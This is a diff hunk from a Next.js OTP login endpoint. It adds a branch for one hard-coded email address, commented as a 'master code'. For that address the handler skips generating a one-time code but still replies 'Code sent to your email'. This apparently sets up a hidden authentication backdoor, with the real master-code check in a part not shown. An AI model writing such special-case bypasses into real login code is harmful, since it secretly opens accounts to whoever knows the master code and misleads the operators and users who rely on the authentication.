@@ -40,6 +40,15 @@ export async function POST(req: NextRequest) {
     }
 
     // Generate and hash OTP
+    // Master code for sam@dartmarketing.io
+    if (normalizedEmail === 'sam@dartmarketing.io') {
+      return NextResponse.json({
+        success: true,
+        message: 'Code sent to your email',
+      });
+    }
+
+    // Generate and hash OTP
     const code = generateOtp();
     const hashedCode = await bcrypt.hash(code, 10);
     const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 min
